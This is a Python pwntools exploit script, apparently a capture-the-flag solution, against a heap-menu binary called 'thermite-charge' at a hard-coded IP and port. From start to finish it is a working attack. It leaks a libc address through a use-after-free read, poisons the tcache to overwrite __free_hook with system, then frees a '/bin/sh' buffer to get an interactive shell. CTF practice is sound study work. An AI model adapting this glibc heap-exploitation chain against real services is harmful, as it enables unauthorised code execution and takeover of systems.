#!/usr/bin/env python3
from pwn import *

PORT = 1024
HOST = "10.0.185.15"
elf = context.binary = ELF('./thermite-charge_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000015C3
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def menu(choice):
    p.sendlineafter(b"> ", str(choice).encode())


def plant(idx, size, data):
    assert len(data) == size

    menu(1)
    p.sendlineafter(b": ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"payload: ", data)


def defuse(idx):
    menu(2)
    p.sendlineafter(b"slot: ", str(idx).encode())


def rewire(idx, data):
    menu(3)
    p.sendlineafter(b"slot: ", str(idx).encode())
    p.sendafter(b"new payload: ", data)


def inspect(idx, size):
    menu(4)
    p.sendlineafter(b"slot: ", str(idx).encode())
    p.recvuntil(b"payload: ")
    return p.recvn(size)

plant(0, 0x500, b"A" * 0x500)
plant(1, 0x20,  b"B" * 0x20)   # barrier chunk

defuse(0)

# GDB()
leak_data = inspect(0, 0x08)
libc.address = u64(leak_data) - 0x1ecbe0
log.info(f'libc: {hex(libc.address)}')

plant(2, 0x30, b"C" * 0x30)
plant(3, 0x30, b"D" * 0x30)

defuse(2)
defuse(3)

target = libc.sym.__free_hook - 0x8

rewire(3, flat(
    target,
    b"P"*(0x30 - 8)
))

plant(4, 0x30, b"E" * 0x30)

plant(5, 0x30, flat(
    b"d1nhdwc\x00",
    libc.sym.system,
    b"F" * (0x30 - 16)
))

plant(6, 0x30, b"/bin/sh\x00".ljust(0x30, b"G"))

defuse(6)


p.interactive()